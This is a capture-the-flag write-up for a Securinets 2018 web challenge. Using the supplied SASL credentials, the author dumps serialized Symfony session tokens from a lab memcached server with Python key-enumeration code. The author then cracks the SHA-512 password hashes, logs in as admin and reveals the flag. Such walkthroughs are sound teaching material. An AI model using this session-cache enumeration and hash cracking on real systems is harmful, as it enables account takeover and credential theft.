<p align="center">
<img src="logo.png"/>
</p>

# CTFSecurinets Quals 2018 Writeup
This repository serves as a writeup for CTFSecurinets Final 2018

## SASL Memcached

**Category:** Web
**Points:** 299
**Author:** TheEmperors
**Description:**

> The Emperor worked in the development of a website in which, authenticated sessions should be logged in a cache server. So he developped this feature in a Memcached server. And to prevend anyone to connect to the Memcached server, he enabled the SASL authentication in the Memcached server. After he finished the development of this feature, The Emperor was fired from this team to another one in the same enterprise. The Emperor wanted to make a revenge on his chief. The Emperor remembred that he own only the memcached credentials and he want to get the admin credentials of the website. Can you help him to successfully authenticate using the admin credentials ? "SASL login=SASL password=securinets_SAAASLLL_hahaha_ok_Xd"
> Link : http://192.168.1.101/

**Hint:**

> The Emperors said that keys stored in the Memcached server are an incremented integer

<p align="center">
<img src="resources/web-299-sasl_memcached/_description.PNG"/>
</p>

### Write-up
When visiting the link of the web application, we find out an authentication form :
<p align="center">
<img src="resources/web-299-sasl_memcached/1.PNG"/>
</p>

After reading the description, it seems that there is no way to bypass authentication without searching the credentials from the memcached server.

But when we tried to authenticate to the memcached server with netcat or telnet. We even tried dumping the memcached key with memcdump command but we failed. Because these commands doesn't require credentials. And in this task we have to authenticate to the memcached server using the given credentials.

So it smells a kind of programming web task.

We tried to authenticate to the memcached server using memcached library in PHP but we failed.

But hopefully, in Python, we found the bmemcached library (binary memcached). We installed it and we tested it and it worked like a charm:

```
pip install bmemcached
python -c "import bmemcached;client = bmemcached.Client(('192.168.1.101:11211', ), 'securinets_SAAASLLL_hahaha_ok_Xd','securinets_SAAASLLL_hahaha_ok_Xd');client.set('key', 'value');print client.get('key');"
```

Output :
```
value
```

So after authenticating to this memcached server and writing and reading some data, we can continue solving this task.

After searching how to dump the memcached data, we found that there is no command that can did this in a binary memcached server (a memcached server in which we authenticated using a SASL credentials). So, if we don't know the keys, we can't did anything.

In the hint, the developper said that the keys stored in the Memcached server are an incremented integer. So we tried to read the key number 1 :
```
python -c "import bmemcached;client = bmemcached.Client(('192.168.1.101:11211', ), 'securinets_SAAASLLL_hahaha_ok_Xd','securinets_SAAASLLL_hahaha_ok_Xd');print client.get('1');"
```

Output :
```
C:74:"Symfony\Component\Security\Core\Authentication\Token\UsernamePasswordToken":742:{a:3:{i:0;N;i:1;s:4:"main";i:2;s:702:"a:4:{i:0;O:41:"Symfony\Component\Security\Core\User\User":7:{s:51:"Symfony\Component\Security\Core\User\Userusername";s:6:"simple";s:51:"Symfony\Component\Security\Core\User\Userpassword";s:128:"2ed75bf2ad6cf1bf10224192e08d3f856e9d09d9b554fdb9e0bac60ef2772baa18d0d261858931a8b14db32646702f43c26748d2b5d2cb388a99a40266e548d5";s:50:"Symfony\Component\Security\Core\User\Userenabled";b:1;s:60:"Symfony\Component\Security\Core\User\UseraccountNonExpired";b:1;s:64:"Symfony\Component\Security\Core\User\UsercredentialsNonExpired";b:1;s:59:"Symfony\Component\Security\Core\User\UseraccountNonLocked";b:1;s:48:"Symfony\Component\Security\Core\User\Userroles";a:0:{}}i:1;b:0;i:2;a:0:{}i:3;a:0:{}}";}}
```

Nice ! This web application is based on the Symfony framework and the session stored in the memcached server contains the user information from the `UsernamePasswordToken` class object.

The username used here is ```simple``` and the password is ```2ed75bf2ad6cf1bf10224192e08d3f856e9d09d9b554fdb9e0bac60ef2772baa18d0d261858931a8b14db32646702f43c26748d2b5d2cb388a99a40266e548d5```. But these credentials doesn't works. Maybe this password is a hash.

We tried the easy solution by cracking this hash in crackstation.net and we found that this hash is the ```sha512(password)```. And the password value iss ```simple```.

So we tried this credentials:
```
Login=simple
Password=simple
```

We successfully authenticated but we found this message:
```
You are not an admin user !
```

We figured out that we only have tried to authenticate with a simple user and not with an administrator user. So we have to read all the memcached keys value in python:

```python
import bmemcached
client = bmemcached.Client(('192.168.1.101:11211', ), 'securinets_SAAASLLL_hahaha_ok_Xd','securinets_SAAASLLL_hahaha_ok_Xd')
for i in range(50): print client.get(str(i))
```

Output :
```
C:74:"Symfony\Component\Security\Core\Authentication\Token\UsernamePasswordToken":742:{a:3:{i:0;N;i:1;s:4:"main";i:2;s:702:"a:4:{i:0;O:41:"Symfony\Component\Security\Core\User\User":7:{s:51:"Symfony\Component\Security\Core\User\Userusername";s:6:"simple";s:51:"Symfony\Component\Security\Core\User\Userpassword";s:128:"2ed75bf2ad6cf1bf10224192e08d3f856e9d09d9b554fdb9e0bac60ef2772baa18d0d261858931a8b14db32646702f43c26748d2b5d2cb388a99a40266e548d5";s:50:"Symfony\Component\Security\Core\User\Userenabled";b:1;s:60:"Symfony\Component\Security\Core\User\UseraccountNonExpired";b:1;s:64:"Symfony\Component\Security\Core\User\UsercredentialsNonExpired";b:1;s:59:"Symfony\Component\Security\Core\User\UseraccountNonLocked";b:1;s:48:"Symfony\Component\Security\Core\User\Userroles";a:0:{}}i:1;b:0;i:2;a:0:{}i:3;a:0:{}}";}}
... (many objects of the simple user)
C:74:"Symfony\Component\Security\Core\Authentication\Token\UsernamePasswordToken":756:{a:3:{i:0;N;i:1;s:4:"main";i:2;s:716:"a:4:{i:0;O:41:"Symfony\Component\Security\Core\User\User":7:{s:51:"Symfony\Component\Security\Core\User\Userusername";s:19:"admin_is_theemperor";s:51:"Symfony\Component\Security\Core\User\Userpassword";s:128:"fe0468680d4f90bf7446e49a3c9100b490a8db06df47588320921a36f0b92703dc7284797bb391a766cbec7c92a9cffa7d1b535c7aa4d345788d0153a93a1ee6";s:50:"Symfony\Component\Security\Core\User\Userenabled";b:1;s:60:"Symfony\Component\Security\Core\User\UseraccountNonExpired";b:1;s:64:"Symfony\Component\Security\Core\User\UsercredentialsNonExpired";b:1;s:59:"Symfony\Component\Security\Core\User\UseraccountNonLocked";b:1;s:48:"Symfony\Component\Security\Core\User\Userroles";a:0:{}}i:1;b:0;i:2;a:0:{}i:3;a:0:{}}";}}
... (many objects of the simple user)
C:74:"Symfony\Component\Security\Core\Authentication\Token\UsernamePasswordToken":742:{a:3:{i:0;N;i:1;s:4:"main";i:2;s:702:"a:4:{i:0;O:41:"Symfony\Component\Security\Core\User\User":7:{s:51:"Symfony\Component\Security\Core\User\Userusername";s:6:"simple";s:51:"Symfony\Component\Security\Core\User\Userpassword";s:128:"2ed75bf2ad6cf1bf10224192e08d3f856e9d09d9b554fdb9e0bac60ef2772baa18d0d261858931a8b14db32646702f43c26748d2b5d2cb388a99a40266e548d5";s:50:"Symfony\Component\Security\Core\User\Userenabled";b:1;s:60:"Symfony\Component\Security\Core\User\UseraccountNonExpired";b:1;s:64:"Symfony\Component\Security\Core\User\UsercredentialsNonExpired";b:1;s:59:"Symfony\Component\Security\Core\User\UseraccountNonLocked";b:1;s:48:"Symfony\Component\Security\Core\User\Userroles";a:0:{}}i:1;b:0;i:2;a:0:{}i:3;a:0:{}}";}}
... (many objects of the simple user)
None
... (many None)
None
```

So the interesting line is this line which contains the administrator credentials:
```
C:74:"Symfony\Component\Security\Core\Authentication\Token\UsernamePasswordToken":756:{a:3:{i:0;N;i:1;s:4:"main";i:2;s:716:"a:4:{i:0;O:41:"Symfony\Component\Security\Core\User\User":7:{s:51:"Symfony\Component\Security\Core\User\Userusername";s:19:"admin_is_theemperor";s:51:"Symfony\Component\Security\Core\User\Userpassword";s:128:"fe0468680d4f90bf7446e49a3c9100b490a8db06df47588320921a36f0b92703dc7284797bb391a766cbec7c92a9cffa7d1b535c7aa4d345788d0153a93a1ee6";s:50:"Symfony\Component\Security\Core\User\Userenabled";b:1;s:60:"Symfony\Component\Security\Core\User\UseraccountNonExpired";b:1;s:64:"Symfony\Component\Security\Core\User\UsercredentialsNonExpired";b:1;s:59:"Symfony\Component\Security\Core\User\UseraccountNonLocked";b:1;s:48:"Symfony\Component\Security\Core\User\Userroles";a:0:{}}i:1;b:0;i:2;a:0:{}i:3;a:0:{}}";}}
```

After cracking the password administrator we found this credentials:
```
Login=admin_is_theemperor
Password=a0000
```

Now, we authenticate using this credentials and we find the flag:
```
Congratulations ! your flag is Flag{Y0_M3mc4cH3d_W1tH_S4SL_4r3_h3LL_xD}
```

So the flag is : ```Flag{Y0_M3mc4cH3d_W1tH_S4SL_4r3_h3LL_xD}```.

For more information how to authenticate to memcached using SASL credentials in all programming language, you can find [here more details](https://devcenter.heroku.com/articles/memcachier).

___










# Scoreboard

This is the scoreboard and the ranking for the 5 teams that they solved at least one task in this CTF :

Summary:

<p align="center">
<img src="scoreboard/ALL.PNG"/>
</p>

Detailed :

<p align="center">
<img src="scoreboard/1.PNG"/>
</p>
<p align="center">
<img src="scoreboard/2.PNG"/>
</p>

If you need the Json file of the scoreboard, you can find it [scoreboard/jsonAdvanced.json](here)

